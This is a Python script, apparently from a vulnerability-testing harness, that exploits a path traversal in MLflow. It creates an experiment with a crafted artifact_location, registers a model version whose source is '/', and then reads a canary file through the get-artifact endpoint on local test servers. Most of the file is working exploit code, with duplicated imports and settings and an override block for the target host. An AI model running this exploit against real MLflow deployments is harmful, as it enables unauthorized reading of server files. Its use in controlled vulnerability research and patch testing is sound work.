#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:40290",
    "v1": "http://127.0.0.1:40291",
}
import os
import sys
import time
from pathlib import Path
import requests
BASE = {
    "v0": "http://127.0.0.1:40290",
    "v1": "http://127.0.0.1:40291",
}
def run_probe(candidate, *, version="v1"):
    # candidate 可为 dict（含 artifact_location）或纯字符串（兼容旧调用形态）
    base = BASE[version]
    if isinstance(candidate, dict):
        trav = candidate.get("artifact_location") or candidate.get("path") or str(candidate)
    else:
        trav = str(candidate)
    return _exploit_via_artifact_location(base, trav)
def _exploit_via_artifact_location(base, traversal_artifact_location):
    
    s = requests.Session()
    ts = str(int(time.time() * 1000000))
    exp_name = f"pcb_{ts}"
    model_name = f"pcb_m_{ts}"

    
    r = s.post(f"{base}/api/2.0/mlflow/experiments/create",
               json={"name": exp_name, "artifact_location": traversal_artifact_location},
               timeout=15)
    if r.status_code != 200:
        return f"BLOCKED:create_experiment:{r.status_code}:{r.text[:200]}"
    exp_id = r.json()["experiment_id"]

    
    r = s.post(f"{base}/api/2.0/mlflow/runs/create",
               json={"experiment_id": exp_id}, timeout=15)
    if r.status_code != 200:
        return f"ERROR:create_run:{r.status_code}:{r.text[:200]}"
    run_id = r.json()["run"]["info"]["run_id"]

    
    s.post(f"{base}/api/2.0/mlflow/registered-models/create",
           json={"name": model_name}, timeout=15)
    r = s.post(f"{base}/api/2.0/mlflow/model-versions/create",
               json={"name": model_name, "source": "/", "run_id": run_id}, timeout=15)
    if r.status_code != 200:
        return f"BLOCKED:create_version:{r.status_code}:{r.text[:200]}"

    
    r = s.get(f"{base}/model-versions/get-artifact",
              params={"path": "canary.txt", "name": model_name, "version": "1"}, timeout=15)
    if r.status_code != 200:
        return f"ERROR:get_artifact:{r.status_code}:{r.text[:200]}"
    return r.text


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))